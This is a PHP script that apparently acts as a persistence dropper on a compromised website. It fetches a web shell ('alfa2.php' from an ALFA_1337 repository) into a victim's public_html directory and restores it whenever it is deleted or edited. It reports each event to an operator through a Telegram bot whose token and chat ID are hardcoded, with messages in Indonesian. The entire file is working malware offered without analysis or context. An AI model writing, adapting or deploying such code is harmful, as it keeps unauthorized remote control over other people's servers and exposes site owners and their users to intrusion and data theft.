<?php
error_reporting(E_ALL);
ini_set('display_errors', 1); 
$file_path = '/home/aztecavi/public_html/alfa2.php';
$directory_path = dirname($file_path);
$url = 'https://raw.githubusercontent.com/CallMeBatosay/ALFA_1337/main/alfa2.php';
$bot_token = '7470301301:AAFEaEpn9_eKbf67UOsEYuU6hLLf4HY_uUw';
$chat_id = '7098630122';

$url_parts = parse_url($url);
$domain = $url_parts['host'];

function sendTelegramMessage($bot_token, $chat_id, $message) {
    $telegram_api_url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $telegram_message = urlencode($message);
    $telegram_chat_id = urlencode($chat_id);

    file_get_contents("$telegram_api_url?chat_id=$telegram_chat_id&text=$telegram_message");
}

if (!is_dir($directory_path)) {
    if (!mkdir($directory_path, 0777, true)) {
        sendTelegramMessage($bot_token, $chat_id, "[ BATOSAY1337 BOT ] Gagal membuat direktori $directory_path. Domain: $domain");
        exit("Gagal membuat direktori $directory_path. Domain: $domain");
    } else {
        sendTelegramMessage($bot_token, $chat_id, "[ BATOSAY1337 BOT ] Direktori $directory_path berhasil dibuat. Domain: $domain");
    }
}

if (file_exists($file_path)) {
    $local_content = file_get_contents($file_path);
    $remote_content = file_get_contents($url);

    if ($local_content === $remote_content) {
        $haheho = "[ BATOSAY1337 BOT ] File $file_path sudah ada dan isinya sama dengan yang di URL. Domain: $domain";
    } else {
        $result = file_put_contents($file_path, $remote_content);
        if ($result !== false) {
            $message = "[ BATOSAY1337 BOT ] File $file_path Seperti Nya Ada Yang Edit Domain: $domain";
            sendTelegramMessage($bot_token, $chat_id, $message);
        } else {
            $gagal = "Gagal memperbarui file $file_path dari URL. Domain: $domain";
            sendTelegramMessage($bot_token, $chat_id, $gagal);
        }
    }
} else {
    $file_content = file_get_contents($url);

    if ($file_content !== false) {
        $result = file_put_contents($file_path, $file_content);
        if ($result !== false) {
            $message = "[ BATOSAY1337 BOT ] File $file_path Seperti Nya Ada Yang Hapus. Domain: $domain";
            sendTelegramMessage($bot_token, $chat_id, $message);
        } else {
            $gagal = "Gagal membuat file $file_path dari URL. Domain: $domain";
            sendTelegramMessage($bot_token, $chat_id, $gagal);
        }
    } else {
        $gagal = "Gagal mengambil konten dari URL. Domain: $domain";
        sendTelegramMessage($bot_token, $chat_id, $gagal);
    }
}
?>
